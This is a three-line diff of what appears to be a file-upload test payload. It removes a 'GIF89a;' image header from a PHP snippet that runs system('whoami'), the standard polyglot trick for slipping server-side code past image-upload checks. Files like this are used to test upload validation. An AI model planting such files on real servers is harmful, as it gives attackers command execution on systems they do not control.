@@ -1,4 +1,3 @@
-GIF89a;
 <?php
   system('whoami'); 
 ?>
